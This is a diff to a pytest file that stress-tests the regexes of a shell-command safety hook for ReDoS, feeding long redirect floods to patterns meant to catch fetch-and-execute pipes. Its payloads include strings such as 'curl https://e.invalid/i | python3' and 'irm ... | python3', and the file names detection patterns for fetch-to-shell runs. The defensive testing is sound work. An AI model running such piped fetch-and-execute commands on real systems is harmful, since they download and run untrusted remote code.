@@ -3220,7 +3220,7 @@ def _redirect_flood(seed: str, lead: str = "", tail: str = "", scale: int = 1) -
     return lead + seed * (scale * _WORST_CASE_BODY_LEN // len(seed)) + tail
 
 
-@pytest.mark.parametrize("label,owner,name,payload", [
+_OUTPUT_REDIRECT_ROWS = [
     # the two quadratics both reviews drove on the first cut (a `>|` read as a
     # clobber and as a new pipe: 4.2 s at 18 KB; fd digits glued to the run
     # before them: 1.2 s at 40 KB, so those rows flood 60 KB, 3.2 s on the
@@ -3241,7 +3241,24 @@ def _redirect_flood(seed: str, lead: str = "", tail: str = "", scale: int = 1) -
      _redirect_flood(">o 2>&1 ", "curl https://e.invalid/i | python3 ", "x")),
     ("fetch-scripter-blank-digits", "sb", "_FETCH_EXEC_PIPE_RE",
      _redirect_flood(" 1", "curl https://e.invalid/i | python3 >", "x")),
-])
+    # the pipe reader's switch runs interleave the unit (both reviews of the
+    # widened lane): a redirect beside a switch, a value, the args after
+    # `--` and the `-` operand, each ending where the run refuses; and the
+    # PowerShell fetch target, which composes the Bash run
+    ("pipe-switch-run-interleaved", "bp", "_INTERP_PIPE_RE", _redirect_flood(" 2>&1 -x", "x | bash", " <")),
+    ("pipe-switch-run-redirects-only", "bp", "_INTERP_PIPE_RE", _redirect_flood(" 2>&1", "x | bash", " <")),
+    ("pipe-switch-value-then-redirect", "bp", "_INTERP_PIPE_RE", _redirect_flood(" -o 2>f", "x | bash", " <")),
+    ("pipe-dash-targets", "bp", "_INTERP_PIPE_RE", _redirect_flood(" > -x", "x | bash", " <")),
+    ("pipe-interpreter-switches", "bp", "_INTERP_PIPE_RE", _redirect_flood(" -W 2>f", "x | python3", " <")),
+    ("pipe-args-after-dashdash", "bp", "_INTERP_PIPE_RE", _redirect_flood(" 2>1", "x | bash -s --", " <")),
+    ("pipe-after-dash-operand", "bp", "_INTERP_PIPE_RE", _redirect_flood(" 2>&1", "x | python3 -", " <")),
+    ("pipe-quoted-targets", "bp", "_INTERP_STDIN_RE", _redirect_flood(" >'a b'", "python3 -", " x")),
+    ("ps-fetch-composed-run", "sb", "_PS_FETCH_EXEC_PIPE_RE",
+     _redirect_flood(">o 2>&1 ", "irm https://e.invalid/i | python3 ", "x")),
+]
+
+
+@pytest.mark.parametrize("label,owner,name,payload", _OUTPUT_REDIRECT_ROWS)
 def test_output_redirect_run_linear_at_every_reader(label, owner, name, payload):
     """DEF-3077: the shared output-redirect run (`_OUTPUT_REDIRECT_RUN`) is
     one parse per redirect at each of its four readers, measured 2-25 ms per
@@ -3264,7 +3281,7 @@ def test_output_redirect_run_linear_at_every_reader(label, owner, name, payload)
     assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"{label} took {elapsed_ms:.1f}ms"
 
 
-@pytest.mark.parametrize("label,owner,name,payload", [
+_SWITCH_REDIRECT_ROWS = [
     # the switch-run sites (air's fb2b3f, sites 1, 2 and 4): a redirect whose
     # spaced target may open on `-` reads `> -x` two ways wherever a switch
     # arm sits beside the unit; a run that offers the unit twice reads every
@@ -3283,7 +3300,54 @@ def test_output_redirect_run_linear_at_every_reader(label, owner, name, payload)
     ("eval-arm-redirects", "sb", "_FETCH_EXEC_SUBST_RE", _redirect_flood(">o 2>&1 ", "eval ", "x")),
     ("python-arm-before-c", "sb", "_FETCH_EXEC_SUBST_RE", _redirect_flood(">o 2>&1 ", "python3 ", "x")),
     ("python-arm-after-c", "sb", "_FETCH_EXEC_SUBST_RE", _redirect_flood(">| ", "python3 -c ", "x")),
-])
+    # the sites the census below found with no row of their own (the
+    # failure-mode review): the here-string reader, the process-substitution
+    # arm, and the -e openers that share Node's tail
+    ("herestring-dash-targets", "bp", "_SHELL_HERESTRING_RE", _redirect_flood("> -x ", "bash ", "x")),
+    ("procsub-arm-redirects", "sb", "_FETCH_EXEC_PROCSUB_RE", _redirect_flood("2>/dev/null ", "bash ", "x")),
+    ("ruby-after-e-dash-targets", "bp", "_RUBY_DASH_E_RE", _redirect_flood("> -x ", "ruby -e ", "<")),
+    ("perl-after-e-dash-targets", "bp", "_PERL_DASH_E_RE", _redirect_flood("> -x ", "perl -e ", "<")),
+]
+
+
+def _patterns_composing(fragment: str) -> set[str]:
+    """Every compiled module-level pattern in the two hook modules whose
+    source holds ``fragment``."""
+    import _speedbump  # noqa: E402
+
+    return {name for mod in (_bash_patterns, _speedbump) for name, value in vars(mod).items()
+            if isinstance(value, re.Pattern) and fragment in value.pattern}
+
+
+def test_every_pattern_composing_a_redirect_unit_has_a_redos_row():
+    """DEF-3077 (the failure-mode review): the rows above are a hand list,
+    so a pattern that picks up either unit -- a new site, or one that
+    composes a site transitively -- with no flood of its own would stay
+    green. The set is derived from the compiled patterns' sources, so this
+    reds the day one joins without a row. Runs on every platform."""
+    composing = (_patterns_composing(_bash_patterns._SWITCH_REDIRECT)
+                 | _patterns_composing(_bash_patterns._OUTPUT_REDIRECT_UNIT))
+    rowed = {row[2] for row in _OUTPUT_REDIRECT_ROWS + _SWITCH_REDIRECT_ROWS}
+    assert composing, "no pattern composes either unit: the census reads nothing"
+    assert not composing - rowed, f"patterns composing a redirect unit with no ReDoS row: {sorted(composing - rowed)}"
+
+
+def test_the_switch_redirect_lookahead_admits_every_arm_it_opens():
+    """The unit opens on a lookahead of the characters a redirect starts
+    with, for per-call cost (DEF-3077). An arm added that starts with any
+    other character would be refused by it silently, so each operator the
+    unit takes matches the same span with the lookahead and without it."""
+    unit = _bash_patterns._SWITCH_REDIRECT
+    head = "(?=[0-9{&<>])"
+    assert unit.startswith(head), unit[:40]
+    bare = re.compile(unit[len(head):])
+    guarded = re.compile(unit)
+    for word in ("2>x", "{fd}>x", "&>x", ">x", "<x", "<>x", ">>x", ">|x", "2>&1", "<&3", "12>x"):
+        a, b = guarded.match(word), bare.match(word)
+        assert a and b and a.span() == b.span(), word
+
+
+@pytest.mark.parametrize("label,owner,name,payload", _SWITCH_REDIRECT_ROWS)
 def test_switch_redirect_linear_at_every_switch_run_site(label, owner, name, payload):
     """DEF-3077: the redirect word in the shared switch runs
     (`_SWITCH_REDIRECT`) is one parse per redirect at each site that carries
